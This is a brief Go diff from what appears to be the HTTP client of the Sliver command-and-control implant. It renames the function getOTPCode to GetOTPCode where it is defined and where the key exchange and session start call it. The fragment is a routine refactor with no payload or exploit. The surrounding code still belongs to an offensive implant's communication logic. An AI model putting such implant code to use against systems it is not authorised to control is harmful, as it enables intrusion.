@@ -168,7 +168,7 @@ func (s *SliverHTTPClient) getPublicKey() *rsa.PublicKey {
 	uri := s.keyExchangeURL()
 	nonce, encoder := encoders.RandomTxtEncoder()
 	s.NonceQueryArgument(uri, nonce)
-	otpCode := getOTPCode()
+	otpCode := GetOTPCode()
 	s.OTPQueryArgument(uri, otpCode)
 
 	// {{if .Config.Debug}}
@@ -226,7 +226,7 @@ func (s *SliverHTTPClient) getSessionID(sessionInit []byte) error {
 
 	uri := s.startSessionURL()
 	s.NonceQueryArgument(uri, nonce)
-	otpCode := getOTPCode()
+	otpCode := GetOTPCode()
 	s.OTPQueryArgument(uri, otpCode)
 	req := s.newHTTPRequest(http.MethodPost, uri, reqBody)
 	// {{if .Config.Debug}}
@@ -542,7 +542,7 @@ func (jar *Jar) Cookies(u *url.URL) []*http.Cookie {
 	return jar.cookies
 }
 
-func getOTPCode() string {
+func GetOTPCode() string {
 	now := time.Now().UTC()
 	opts := totp.ValidateOpts{
 		Digits:    8,
